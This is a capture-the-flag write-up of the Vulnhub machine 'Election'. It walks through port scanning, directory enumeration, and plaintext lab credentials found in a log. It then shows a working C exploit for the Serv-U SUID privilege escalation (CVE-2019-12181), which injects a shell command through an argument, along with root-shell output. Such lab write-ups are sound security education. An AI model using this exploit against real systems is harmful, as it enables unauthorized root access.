---
title: Election Writeup
author: ak3dv
date: 2023-02-19
categories: [Writeup, Vulnhub]
tags: [Linux, CTF, SUID]
image:
  path: ../../assets/img/commons/Election/election_logo.png
  width: 700
  height: 900
  alt: Banner Election
---

We are going to solve an easy Linux machine from Vulnhub called Election.

## Exploitation Guide for Election

### Scanning

```bash
# Nmap 7.93 scan initiated Sun Dec  4 16:28:15 2022 as: nmap -p22,80 -n -v -sCV -oN targeted 192.168.79.131
Nmap scan report for 192.168.79.131
Host is up (0.00055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20d1ed84cc68a5a786f0dab8923fd967 (RSA)
|   256 7889b3a2751276922af98d27c108a7b9 (ECDSA)
|_  256 b8f4d661cf1690c5071899b07c70fdc0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec  4 16:28:22 2022 -- 1 IP address (1 host up) scanned in 6.84 seconds
```

### Web Enumeration

Accessing the web we see the default configuration page of apache but nothing interesting.

![Web](/assets/img/commons/Election/web.png)

#### Dirsearch

We can run `dirsearch` to list directories and files on the server.

```bash
dirsearch -u http://192.168.79.131

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/akera/.dirsearch/reports/192.168.79.131/_23-02-19_15-32-29.txt

Error Log: /home/akera/.dirsearch/logs/errors-23-02-19_15-32-29.log

Target: http://192.168.79.131/

[15:32:29] Starting: 
[15:32:59] 200 -   11KB - /index.html
[15:33:00] 301 -  321B  - /javascript  ->  http://192.168.79.131/javascript/
[15:33:07] 200 -   13KB - /phpmyadmin/doc/html/index.html
[15:33:08] 301 -  321B  - /phpmyadmin  ->  http://192.168.79.131/phpmyadmin/
[15:33:10] 200 -   10KB - /phpmyadmin/index.php
[15:33:10] 200 -   10KB - /phpmyadmin/
[15:33:11] 200 -   94KB - /phpinfo.php
[15:33:14] 200 -   30B  - /robots.txt
[15:33:15] 403 -  279B  - /server-status/
[15:33:15] 403 -  279B  - /server-status

Task Completed
```

#### Robots.txt

Looking inside the `robots.txt` file, we find some routes.

![Robots](/assets/img/commons/Election/robots.png)

The `election` page is the only one that exists.

![Election](/assets/img/commons/Election/election.png)

#### Logs

Running dirsearch again on the `election` directory , we notice an interesting folder: `logs`.

```bash
dirsearch -u http://192.168.79.131/election

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/akera/.dirsearch/reports/192.168.79.131/-election_23-02-19_17-00-51.txt

Error Log: /home/akera/.dirsearch/logs/errors-23-02-19_17-00-51.log

Target: http://192.168.79.131/election/

[17:00:51] Starting: 
[17:00:53] 301 -  322B  - /election/js  ->  http://192.168.79.131/election/js/
[17:01:02] 301 -  325B  - /election/admin  ->  http://192.168.79.131/election/admin/
[17:01:03] 403 -  279B  - /election/admin/.htaccess
[17:01:03] 200 -    9KB - /election/admin/
[17:01:03] 200 -    9KB - /election/admin/?/login
[17:01:03] 200 -    9KB - /election/admin/index.php
[17:01:03] 200 -  985B  - /election/admin/logs/
[17:01:15] 200 -  766B  - /election/data/
[17:01:15] 301 -  324B  - /election/data  ->  http://192.168.79.131/election/data/
[17:01:22] 200 -    7KB - /election/index.php
[17:01:22] 200 -    7KB - /election/index.php/login/
[17:01:23] 200 -  989B  - /election/js/
[17:01:24] 301 -  329B  - /election/languages  ->  http://192.168.79.131/election/languages/
[17:01:24] 200 -  967B  - /election/lib/
[17:01:24] 301 -  323B  - /election/lib  ->  http://192.168.79.131/election/lib/
[17:01:26] 200 -    2KB - /election/media/
[17:01:26] 301 -  325B  - /election/media  ->  http://192.168.79.131/election/media/
[17:01:41] 301 -  326B  - /election/themes  ->  http://192.168.79.131/election/themes/
[17:01:41] 200 -  964B  - /election/themes/

Task Completed
```

Inside this folder, we identify a `system.log` file with plaintext credentials `love`:`P@$$w0rd@123`.

![Log](/assets/img/commons/Election/logs.png)


```bash
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
[2022-12-04 22:07:02] Love has been logged in from Unknown IP on Firefox (Linux).
[2022-12-04 22:11:31]  has been logged out from Unknown IP.
```

With these credentials, we are able to log in via SSH.

### PRIV ESC

Searching for SUID binaries, we found an interesting one `/usr/local/Serv-U/Serv-U`.

```bash
love@election:~$ find / -perm /4000 2>/dev/null
/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/local/Serv-U/Serv-U
..........
```

Doing a quick google search, we see that is vulnerable to a [Local privilege Escalation](https://www.exploit-db.com/exploits/47009) exploit.

```bash
/*

CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation 

vulnerability found by:
Guy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev

to compile and run:
gcc servu-pe-cve-2019-12181.c -o pe && ./pe

*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}  
```

Let's compile the exploit with `gcc` and run it to get a shell as root.

```bash
love@election:/tmp$ gcc exploit.c -o exploit
love@election:/tmp$ ./exploit 
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell
# whoami
root
```